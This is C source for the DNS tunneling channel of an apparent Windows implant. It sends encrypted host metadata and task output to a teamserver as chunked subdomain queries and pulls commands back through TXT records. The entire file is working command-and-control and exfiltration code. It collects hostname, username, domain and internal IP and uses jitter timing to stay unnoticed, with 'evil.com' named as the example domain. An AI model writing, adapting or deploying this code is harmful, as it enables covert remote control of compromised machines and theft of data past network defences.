#include "dns.h"
#include "../config.h"
#include "../crypto/aes.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

/*
 * DNS Tunneling Communication Channel
 *
 * Protocol overview:
 *   Outbound (implant -> teamserver):
 *     1. JSON payload -> AES-256-GCM encrypt -> base32 encode
 *     2. Split into chunks that fit DNS label limits
 *     3. Send as subdomain queries: <type><seq>.<chunk>.<session>.<domain>
 *     4. Teamserver's authoritative DNS server intercepts queries
 *
 *   Inbound (teamserver -> implant):
 *     1. TXT record response contains base64-encoded encrypted data
 *     2. Reassemble multi-record responses
 *     3. Base64 decode -> AES-256-GCM decrypt -> JSON parse
 *
 *   Session tracking:
 *     - 8-char hex session ID derived from implant ID
 *     - Sequence numbers for chunk ordering
 *     - Final chunk signaled by 'f' suffix on type prefix
 */

// ============================================================
// Globals
// ============================================================

static SOCKET g_sock = INVALID_SOCKET;
static struct sockaddr_in g_nameserver;
static BYTE g_aes_key[32];
static WORD g_txid = 0;
static char g_session_id[9]; // 8 hex chars + null

// ============================================================
// Base32 Encoder/Decoder (RFC 4648, lowercase, no padding)
// ============================================================

static const char b32_alphabet[] = "abcdefghijklmnopqrstuvwxyz234567";

static const BYTE b32_decode_table[128] = {
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255, 26, 27, 28, 29, 30, 31,255,255,255,255,255,255,255,255, // 2-7
    255,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, // A-O
     15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,255,255,255,255,255, // P-Z
    255,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, // a-o
     15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,255,255,255,255,255  // p-z
};

int dn_base32_encode(const BYTE* src, int src_len, char* dst, int dst_size) {
    int pos = 0;
    int i = 0;

    while (i < src_len && pos < dst_size - 1) {
        int remaining = src_len - i;
        DWORD block = 0;
        int bits = 0;

        // accumulate up to 5 bytes (40 bits)
        for (int j = 0; j < 5 && j < remaining; j++) {
            block = (block << 8) | src[i + j];
            bits += 8;
        }

        // pad to multiple of 5 bits
        int chars = (bits + 4) / 5;
        block <<= (chars * 5 - bits);

        // extract 5-bit groups
        for (int j = chars - 1; j >= 0; j--) {
            if (pos + j < dst_size - 1) {
                dst[pos + j] = b32_alphabet[block & 0x1F];
            }
            block >>= 5;
        }
        pos += chars;
        i += (remaining >= 5) ? 5 : remaining;
    }

    dst[pos] = '\0';
    return pos;
}

int dn_base32_decode(const char* src, int src_len, BYTE* dst, int dst_size) {
    int pos = 0;
    int buffer = 0;
    int bits_in_buffer = 0;

    for (int i = 0; i < src_len && pos < dst_size; i++) {
        unsigned char c = (unsigned char)src[i];
        if (c >= 128 || b32_decode_table[c] == 255) continue;

        buffer = (buffer << 5) | b32_decode_table[c];
        bits_in_buffer += 5;

        if (bits_in_buffer >= 8) {
            bits_in_buffer -= 8;
            dst[pos++] = (BYTE)((buffer >> bits_in_buffer) & 0xFF);
        }
    }

    return pos;
}

// ============================================================
// Base64 Decoder (for TXT record responses)
// ============================================================

static const BYTE b64_decode_table[128] = {
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255, 62,255,255,255, 63, // +, /
     52, 53, 54, 55, 56, 57, 58, 59, 60, 61,255,255,255,  0,255,255, // 0-9, =
    255,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, // A-O
     15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,255,255,255,255,255, // P-Z
    255, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, // a-o
     41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51,255,255,255,255,255  // p-z
};

int dn_base64_decode(const char* src, int src_len, BYTE* dst, int dst_size) {
    int pos = 0;
    int buffer = 0;
    int bits_in_buffer = 0;

    for (int i = 0; i < src_len && pos < dst_size; i++) {
        unsigned char c = (unsigned char)src[i];
        if (c == '=' || c == '\n' || c == '\r' || c == ' ') continue;
        if (c >= 128 || b64_decode_table[c] == 255) continue;

        buffer = (buffer << 6) | b64_decode_table[c];
        bits_in_buffer += 6;

        if (bits_in_buffer >= 8) {
            bits_in_buffer -= 8;
            dst[pos++] = (BYTE)((buffer >> bits_in_buffer) & 0xFF);
        }
    }

    return pos;
}

// ============================================================
// DNS Packet Construction (raw, no windns.h)
// ============================================================

// DNS header structure
typedef struct {
    WORD id;
    WORD flags;
    WORD qdcount;
    WORD ancount;
    WORD nscount;
    WORD arcount;
} DNS_HEADER;

// Encode a domain name into DNS wire format (length-prefixed labels)
// e.g., "c0.abcdef.sess1234.evil.com" -> \2c0\6abcdef\8sess1234\4evil\3com\0
static int dns_encode_name(const char* name, BYTE* buf, int buf_size) {
    int pos = 0;
    const char* p = name;

    while (*p && pos < buf_size - 2) {
        const char* dot = strchr(p, '.');
        int label_len = dot ? (int)(dot - p) : (int)strlen(p);

        if (label_len > DN_DNS_MAX_LABEL || label_len == 0) return -1;

        buf[pos++] = (BYTE)label_len;
        memcpy(buf + pos, p, label_len);
        pos += label_len;

        p += label_len;
        if (*p == '.') p++;
    }

    buf[pos++] = 0; // root label
    return pos;
}

// Build a DNS query packet
static int dns_build_query(const char* qname, WORD qtype, BYTE* pkt, int pkt_size) {
    if (pkt_size < DN_DNS_HDR_SIZE + 4) return -1;

    // transaction ID
    g_txid = (WORD)((GetTickCount() ^ GetCurrentThreadId()) & 0xFFFF);

    // header
    DNS_HEADER* hdr = (DNS_HEADER*)pkt;
    hdr->id = htons(g_txid);
    hdr->flags = htons(0x0100); // standard query, recursion desired
    hdr->qdcount = htons(1);
    hdr->ancount = 0;
    hdr->nscount = 0;
    hdr->arcount = 0;

    int pos = DN_DNS_HDR_SIZE;

    // question section: QNAME
    int name_len = dns_encode_name(qname, pkt + pos, pkt_size - pos);
    if (name_len < 0) return -1;
    pos += name_len;

    // QTYPE
    if (pos + 4 > pkt_size) return -1;
    *(WORD*)(pkt + pos) = htons(qtype);
    pos += 2;

    // QCLASS (IN)
    *(WORD*)(pkt + pos) = htons(1);
    pos += 2;

    return pos;
}

// Parse DNS response, extract TXT record data
// Returns concatenated TXT data in dst, or 0 on failure
static int dns_parse_txt_response(const BYTE* pkt, int pkt_len, char* dst, int dst_size) {
    if (pkt_len < DN_DNS_HDR_SIZE) return 0;

    DNS_HEADER* hdr = (DNS_HEADER*)pkt;

    // verify this is our response
    if (ntohs(hdr->id) != g_txid) return 0;

    // check for errors (RCODE in lower 4 bits of flags)
    WORD flags = ntohs(hdr->flags);
    if ((flags & 0x000F) != 0) return 0; // non-zero RCODE = error

    int ancount = ntohs(hdr->ancount);
    if (ancount == 0) return 0;

    // skip question section
    int pos = DN_DNS_HDR_SIZE;

    // skip QNAME (walk labels until root)
    while (pos < pkt_len && pkt[pos] != 0) {
        if ((pkt[pos] & 0xC0) == 0xC0) {
            pos += 2; // compression pointer
            goto skip_qtype;
        }
        pos += 1 + pkt[pos]; // label length + label
    }
    pos++; // skip root label (0x00)

skip_qtype:
    pos += 4; // skip QTYPE + QCLASS

    // parse answer records
    int dst_pos = 0;

    for (int i = 0; i < ancount && pos < pkt_len; i++) {
        // skip NAME (handle compression pointers)
        while (pos < pkt_len) {
            if ((pkt[pos] & 0xC0) == 0xC0) {
                pos += 2;
                break;
            }
            if (pkt[pos] == 0) {
                pos++;
                break;
            }
            pos += 1 + pkt[pos];
        }

        if (pos + 10 > pkt_len) break;

        WORD rtype = ntohs(*(WORD*)(pkt + pos)); pos += 2;
        /* rclass */ pos += 2;
        /* ttl    */ pos += 4;
        WORD rdlength = ntohs(*(WORD*)(pkt + pos)); pos += 2;

        if (rtype == DN_DNS_TYPE_TXT && rdlength > 0) {
            // TXT record: one or more <length><text> segments
            int rdata_end = pos + rdlength;
            while (pos < rdata_end && pos < pkt_len) {
                BYTE txt_len = pkt[pos++];
                if (pos + txt_len > pkt_len) break;
                int copy_len = (dst_pos + txt_len < dst_size - 1) ? txt_len : (dst_size - 1 - dst_pos);
                if (copy_len > 0) {
                    memcpy(dst + dst_pos, pkt + pos, copy_len);
                    dst_pos += copy_len;
                }
                pos += txt_len;
            }
        } else {
            // skip this record's data
            pos += rdlength;
        }
    }

    dst[dst_pos] = '\0';
    return dst_pos;
}

// Parse DNS response for A record (used as ACK: 4 bytes encode status)
static BOOL dns_parse_a_response(const BYTE* pkt, int pkt_len, DWORD* ip_out) {
    if (pkt_len < DN_DNS_HDR_SIZE) return FALSE;

    DNS_HEADER* hdr = (DNS_HEADER*)pkt;
    if (ntohs(hdr->id) != g_txid) return FALSE;

    WORD flags = ntohs(hdr->flags);
    if ((flags & 0x000F) != 0) return FALSE;

    int ancount = ntohs(hdr->ancount);
    if (ancount == 0) return FALSE;

    // skip question section
    int pos = DN_DNS_HDR_SIZE;
    while (pos < pkt_len && pkt[pos] != 0) {
        if ((pkt[pos] & 0xC0) == 0xC0) { pos += 2; goto a_skip_q; }
        pos += 1 + pkt[pos];
    }
    pos++;
a_skip_q:
    pos += 4;

    // find first A record
    for (int i = 0; i < ancount && pos < pkt_len; i++) {
        while (pos < pkt_len) {
            if ((pkt[pos] & 0xC0) == 0xC0) { pos += 2; break; }
            if (pkt[pos] == 0) { pos++; break; }
            pos += 1 + pkt[pos];
        }
        if (pos + 10 > pkt_len) return FALSE;

        WORD rtype = ntohs(*(WORD*)(pkt + pos)); pos += 2;
        pos += 2; // class
        pos += 4; // ttl
        WORD rdlen = ntohs(*(WORD*)(pkt + pos)); pos += 2;

        if (rtype == DN_DNS_TYPE_A && rdlen == 4) {
            *ip_out = *(DWORD*)(pkt + pos);
            return TRUE;
        }
        pos += rdlen;
    }

    return FALSE;
}

// ============================================================
// DNS Transport (raw UDP)
// ============================================================

// Send query and receive response with timeout
static int dns_query(const char* qname, WORD qtype, BYTE* resp_buf, int resp_size) {
    BYTE query[DN_DNS_MAX_UDP];
    int query_len = dns_build_query(qname, qtype, query, sizeof(query));
    if (query_len < 0) return -1;

    // send
    int sent = sendto(g_sock, (const char*)query, query_len, 0,
                      (struct sockaddr*)&g_nameserver, sizeof(g_nameserver));
    if (sent == SOCKET_ERROR) return -1;

    // receive with timeout (already set via setsockopt)
    int resp_len = recvfrom(g_sock, (char*)resp_buf, resp_size, 0, NULL, NULL);
    if (resp_len == SOCKET_ERROR) return -1;

    return resp_len;
}

// ============================================================
// Data Chunking and Reassembly
// ============================================================

// Build a DNS query name for a data chunk
// Format: <type><seq>.<chunk_data>.<session_id>.<domain>
// chunk_data is split into multiple labels of max 63 chars each
static int build_tunnel_qname(char prefix, int seq, BOOL is_final,
                               const char* chunk_data, int chunk_len,
                               char* qname, int qname_size) {
    int pos = 0;

    // first label: type prefix + sequence number
    // 'f' suffix indicates final chunk
    if (is_final) {
        pos += snprintf(qname + pos, qname_size - pos, "%c%xf.", prefix, seq);
    } else {
        pos += snprintf(qname + pos, qname_size - pos, "%c%x.", prefix, seq);
    }

    // data labels (split chunk_data into 63-char labels)
    int data_pos = 0;
    while (data_pos < chunk_len) {
        int label_len = chunk_len - data_pos;
        if (label_len > DN_DNS_MAX_LABEL) label_len = DN_DNS_MAX_LABEL;

        memcpy(qname + pos, chunk_data + data_pos, label_len);
        pos += label_len;
        qname[pos++] = '.';
        data_pos += label_len;
    }

    // session ID label
    pos += snprintf(qname + pos, qname_size - pos, "%s.", g_session_id);

    // domain suffix
    pos += snprintf(qname + pos, qname_size - pos, "%s", DN_DNS_DOMAIN);

    qname[pos] = '\0';
    return pos;
}

// Send encrypted data over DNS tunnel (chunked)
// Returns TRUE if all chunks acknowledged
static BOOL dns_send_data(char prefix, const BYTE* data, DWORD data_len) {
    // base32 encode the encrypted data
    int b32_size = ((data_len * 8 + 4) / 5) + 1;
    char* b32_buf = (char*)HeapAlloc(GetProcessHeap(), 0, b32_size);
    if (!b32_buf) return FALSE;

    int b32_len = dn_base32_encode(data, data_len, b32_buf, b32_size);

    // calculate max data per query
    // qname budget: 253 - len(session_id) - len(domain) - len(prefix_label) - dots
    int overhead = (int)strlen(g_session_id) + (int)strlen(DN_DNS_DOMAIN) + 10 + 4; // labels + dots + prefix
    int max_data_per_query = DN_DNS_MAX_NAME - overhead;
    // account for extra dots from label splitting
    max_data_per_query -= (max_data_per_query / DN_DNS_MAX_LABEL);
    if (max_data_per_query > DN_DNS_CHUNK_DATA) max_data_per_query = DN_DNS_CHUNK_DATA;
    if (max_data_per_query < 20) max_data_per_query = 20;

    int offset = 0;
    int seq = 0;
    BOOL success = TRUE;

    while (offset < b32_len) {
        int chunk_len = b32_len - offset;
        if (chunk_len > max_data_per_query) chunk_len = max_data_per_query;
        BOOL is_final = (offset + chunk_len >= b32_len);

        // build query name
        char qname[DN_DNS_MAX_NAME + 1];
        build_tunnel_qname(prefix, seq, is_final,
                           b32_buf + offset, chunk_len,
                           qname, sizeof(qname));

        // send query, expect A record ACK
        BYTE resp[DN_DNS_MAX_UDP];
        int resp_len = dns_query(qname, DN_DNS_TYPE_A, resp, sizeof(resp));

        if (resp_len < 0) {
            // retry once
            resp_len = dns_query(qname, DN_DNS_TYPE_A, resp, sizeof(resp));
            if (resp_len < 0) {
                success = FALSE;
                break;
            }
        }

        // parse ACK (any valid A record response = acknowledged)
        DWORD ack_ip = 0;
        if (!dns_parse_a_response(resp, resp_len, &ack_ip)) {
            success = FALSE;
            break;
        }

        offset += chunk_len;
        seq++;

        // small delay between queries to avoid DNS rate limiting
        if (!is_final) {
            Sleep(50 + (rand() % 100)); // 50-150ms jitter
        }
    }

    HeapFree(GetProcessHeap(), 0, b32_buf);
    return success;
}

// Poll for data via TXT record query, receive and reassemble
// Returns decrypted response or NULL
static BYTE* dns_recv_data(char prefix, DWORD* out_len) {
    // send poll query
    char qname[DN_DNS_MAX_NAME + 1];
    snprintf(qname, sizeof(qname), "%c0.%s.%s", prefix, g_session_id, DN_DNS_DOMAIN);

    BYTE resp[DN_DNS_MAX_EDNS];
    int resp_len = dns_query(qname, DN_DNS_TYPE_TXT, resp, sizeof(resp));
    if (resp_len < 0) return NULL;

    // extract TXT record data (base64 encoded)
    char txt_data[DN_DNS_MAX_EDNS];
    int txt_len = dns_parse_txt_response(resp, resp_len, txt_data, sizeof(txt_data));
    if (txt_len == 0) return NULL;

    // check for "NONE" response (no data available)
    if (txt_len == 4 && memcmp(txt_data, "NONE", 4) == 0) {
        *out_len = 0;
        return NULL;
    }

    // if response indicates more chunks, fetch them
    // format: first TXT starts with "M<total_chunks>:" for multi-part
    BYTE* reassembled = NULL;
    int total_decoded = 0;

    if (txt_len > 2 && txt_data[0] == 'M') {
        // multi-part response
        int total_chunks = 0;
        const char* colon = strchr(txt_data, ':');
        if (!colon) return NULL;

        total_chunks = atoi(txt_data + 1);
        if (total_chunks <= 0 || total_chunks > 256) return NULL;

        // allocate reassembly buffer
        int buf_size = total_chunks * 300; // generous estimate
        reassembled = (BYTE*)HeapAlloc(GetProcessHeap(), 0, buf_size);
        if (!reassembled) return NULL;

        // decode first chunk (after "M<n>:" prefix)
        const char* first_data = colon + 1;
        int first_len = txt_len - (int)(first_data - txt_data);
        total_decoded = dn_base64_decode(first_data, first_len, reassembled, buf_size);

        // fetch remaining chunks
        for (int i = 1; i < total_chunks; i++) {
            snprintf(qname, sizeof(qname), "%c%x.%s.%s", prefix, i, g_session_id, DN_DNS_DOMAIN);

            resp_len = dns_query(qname, DN_DNS_TYPE_TXT, resp, sizeof(resp));
            if (resp_len < 0) {
                HeapFree(GetProcessHeap(), 0, reassembled);
                return NULL;
            }

            txt_len = dns_parse_txt_response(resp, resp_len, txt_data, sizeof(txt_data));
            if (txt_len == 0) {
                HeapFree(GetProcessHeap(), 0, reassembled);
                return NULL;
            }

            int decoded = dn_base64_decode(txt_data, txt_len,
                                           reassembled + total_decoded,
                                           buf_size - total_decoded);
            total_decoded += decoded;

            Sleep(30 + (rand() % 70));
        }
    } else {
        // single-part response
        int buf_size = txt_len; // base64 decodes to <= input length
        reassembled = (BYTE*)HeapAlloc(GetProcessHeap(), 0, buf_size);
        if (!reassembled) return NULL;

        total_decoded = dn_base64_decode(txt_data, txt_len, reassembled, buf_size);
    }

    if (total_decoded == 0) {
        HeapFree(GetProcessHeap(), 0, reassembled);
        return NULL;
    }

    // decrypt the reassembled data
    DWORD dec_len = 0;
    BYTE* decrypted = dn_aes_decrypt(g_aes_key, reassembled, total_decoded, &dec_len);
    HeapFree(GetProcessHeap(), 0, reassembled);

    if (!decrypted) return NULL;

    *out_len = dec_len;
    return decrypted;
}

// ============================================================
// JSON Builders (same format as HTTPS channel)
// ============================================================

static int json_escape_string(char* dst, int dst_size, const char* src) {
    int pos = 0;
    if (!src) return 0;

    for (int i = 0; src[i] && pos < dst_size - 6; i++) {
        unsigned char c = (unsigned char)src[i];
        switch (c) {
            case '\\': dst[pos++] = '\\'; dst[pos++] = '\\'; break;
            case '"':  dst[pos++] = '\\'; dst[pos++] = '"';  break;
            case '\n': dst[pos++] = '\\'; dst[pos++] = 'n';  break;
            case '\r': dst[pos++] = '\\'; dst[pos++] = 'r';  break;
            case '\t': dst[pos++] = '\\'; dst[pos++] = 't';  break;
            default:
                if (c < 0x20) {
                    pos += snprintf(dst + pos, dst_size - pos, "\\u%04x", c);
                } else {
                    dst[pos++] = c;
                }
                break;
        }
    }
    dst[pos] = '\0';
    return pos;
}

static int json_build_metadata(char* buf, int buf_size, DN_METADATA* meta) {
    char esc_proc[512], esc_host[256], esc_user[256], esc_domain[256];
    json_escape_string(esc_proc, sizeof(esc_proc), meta->process_name);
    json_escape_string(esc_host, sizeof(esc_host), meta->hostname);
    json_escape_string(esc_user, sizeof(esc_user), meta->username);
    json_escape_string(esc_domain, sizeof(esc_domain), meta->domain);

    return snprintf(buf, buf_size,
        "{\"id\":\"%s\",\"hostname\":\"%s\",\"username\":\"%s\","
        "\"domain\":\"%s\",\"internal_ip\":\"%s\",\"os\":\"%s\","
        "\"arch\":\"%s\",\"pid\":%lu,\"process_name\":\"%s\","
        "\"sleep\":%d,\"jitter\":%d,\"channel\":\"dns\"}",
        meta->id, esc_host, esc_user,
        esc_domain, meta->internal_ip, meta->os,
        meta->arch, meta->pid, esc_proc,
        meta->sleep, meta->jitter
    );
}

static int json_build_result(char* buf, int buf_size, DN_TASK_RESULT* result) {
    char escaped[32768];
    json_escape_string(escaped, sizeof(escaped), result->output);

    return snprintf(buf, buf_size,
        "{\"task_id\":\"%s\",\"status\":\"%s\",\"output\":\"%s\"}",
        result->task_id, result->status, escaped
    );
}

static int json_build_results_array(char* buf, int buf_size, DN_TASK_RESULT* results, int count) {
    int pos = 0;
    buf[pos++] = '[';
    for (int i = 0; i < count; i++) {
        if (i > 0) buf[pos++] = ',';
        pos += json_build_result(buf + pos, buf_size - pos, &results[i]);
    }
    buf[pos++] = ']';
    buf[pos] = '\0';
    return pos;
}

// ============================================================
// Response Parser (same format as HTTPS channel)
// ============================================================

static BOOL parse_checkin_response(const char* json, DN_CHECKIN_RESPONSE* resp) {
    resp->tasks = NULL;
    resp->task_count = 0;

    const char* tasks_start = strstr(json, "\"tasks\"");
    if (!tasks_start) return TRUE;

    const char* arr_start = strchr(tasks_start, '[');
    if (!arr_start) return TRUE;

    int count = 0;
    const char* p = arr_start;
    while ((p = strchr(p + 1, '{')) != NULL) count++;
    if (count == 0) return TRUE;

    resp->tasks = (DN_TASK*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DN_TASK) * count);
    if (!resp->tasks) return FALSE;
    resp->task_count = count;

    p = arr_start;
    for (int i = 0; i < count; i++) {
        p = strchr(p, '{');
        if (!p) break;

        const char* id_start = strstr(p, "\"id\":\"");
        if (id_start) {
            id_start += 6;
            const char* id_end = strchr(id_start, '"');
            if (id_end) {
                int len = (int)(id_end - id_start);
                if (len > 63) len = 63;
                memcpy(resp->tasks[i].id, id_start, len);
            }
        }

        const char* cmd_start = strstr(p, "\"command\":\"");
        if (cmd_start) {
            cmd_start += 11;
            const char* cmd_end = strchr(cmd_start, '"');
            if (cmd_end) {
                int len = (int)(cmd_end - cmd_start);
                if (len > 63) len = 63;
                memcpy(resp->tasks[i].command, cmd_start, len);
            }
        }

        const char* args_start = strstr(p, "\"args\":\"");
        if (args_start) {
            args_start += 8;
            const char* args_end = strchr(args_start, '"');
            if (args_end) {
                int len = (int)(args_end - args_start);
                resp->tasks[i].args = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + 1);
                if (resp->tasks[i].args) {
                    memcpy(resp->tasks[i].args, args_start, len);
                    resp->tasks[i].args_len = len;
                }
            }
        }

        p++;
    }

    return TRUE;
}

// ============================================================
// Public API
// ============================================================

BOOL dn_dns_init(void) {
    // init Winsock
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;

    // decode PSK
    dn_aes_init(g_aes_key, DN_PSK_HEX);

    // create UDP socket
    g_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (g_sock == INVALID_SOCKET) return FALSE;

    // set receive timeout (5 seconds)
    DWORD timeout = 5000;
    setsockopt(g_sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    // resolve nameserver address
    ZeroMemory(&g_nameserver, sizeof(g_nameserver));
    g_nameserver.sin_family = AF_INET;
    g_nameserver.sin_port = htons(53);

#ifdef DN_DNS_NAMESERVER
    // use configured nameserver
    inet_pton(AF_INET, DN_DNS_NAMESERVER, &g_nameserver.sin_addr);
#else
    // use system default DNS (8.8.8.8 fallback)
    // in production, traffic routes through normal DNS resolution
    // which reaches the authoritative server for DN_DNS_DOMAIN
    g_nameserver.sin_addr.s_addr = inet_addr("8.8.8.8");
#endif

    // generate session ID from build ID (first 8 chars)
    memcpy(g_session_id, DN_BUILD_ID, 8);
    g_session_id[8] = '\0';

    return TRUE;
}

BOOL dn_dns_checkin(DN_METADATA* meta, DN_CHECKIN_RESPONSE* response) {
    // build JSON metadata
    char json_buf[2048];
    int json_len = json_build_metadata(json_buf, sizeof(json_buf), meta);

    // encrypt
    DWORD enc_len = 0;
    BYTE* encrypted = dn_aes_encrypt(g_aes_key, (BYTE*)json_buf, json_len, &enc_len);
    if (!encrypted) return FALSE;

    // send encrypted metadata via DNS data queries
    BOOL sent = dns_send_data(DN_DNS_PREFIX_CHECKIN, encrypted, enc_len);
    HeapFree(GetProcessHeap(), 0, encrypted);

    if (!sent) return FALSE;

    // small delay before polling for response
    Sleep(200 + (rand() % 300));

    // poll for tasks via TXT record
    DWORD resp_len = 0;
    BYTE* resp_data = dns_recv_data(DN_DNS_PREFIX_POLL, &resp_len);

    if (!resp_data || resp_len == 0) {
        // no tasks available (normal, not an error)
        response->tasks = NULL;
        response->task_count = 0;
        return TRUE;
    }

    // null-terminate for JSON parsing
    BYTE* json_resp = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, resp_len + 1);
    if (!json_resp) {
        HeapFree(GetProcessHeap(), 0, resp_data);
        return FALSE;
    }
    memcpy(json_resp, resp_data, resp_len);
    HeapFree(GetProcessHeap(), 0, resp_data);

    BOOL ok = parse_checkin_response((char*)json_resp, response);
    HeapFree(GetProcessHeap(), 0, json_resp);

    return ok;
}

BOOL dn_dns_send_results(DN_TASK_RESULT* results, int count) {
    if (count == 0) return TRUE;

    // DNS has lower bandwidth than HTTPS, so send results one at a time
    // to avoid massive multi-chunk transfers
    for (int i = 0; i < count; i++) {
        char json_buf[32768];
        int json_len = json_build_result(json_buf, sizeof(json_buf), &results[i]);

        // wrap single result in array for consistent server-side parsing
        char wrapped[32800];
        int wrapped_len = snprintf(wrapped, sizeof(wrapped), "[%s]", json_buf);

        // encrypt
        DWORD enc_len = 0;
        BYTE* encrypted = dn_aes_encrypt(g_aes_key, (BYTE*)wrapped, wrapped_len, &enc_len);
        if (!encrypted) return FALSE;

        BOOL sent = dns_send_data(DN_DNS_PREFIX_DATA, encrypted, enc_len);
        HeapFree(GetProcessHeap(), 0, encrypted);

        if (!sent) return FALSE;

        // delay between results to avoid DNS flooding
        if (i < count - 1) {
            Sleep(100 + (rand() % 200));
        }
    }

    return TRUE;
}

void dn_dns_cleanup(void) {
    if (g_sock != INVALID_SOCKET) {
        closesocket(g_sock);
        g_sock = INVALID_SOCKET;
    }
    WSACleanup();
    SecureZeroMemory(g_aes_key, sizeof(g_aes_key));
}
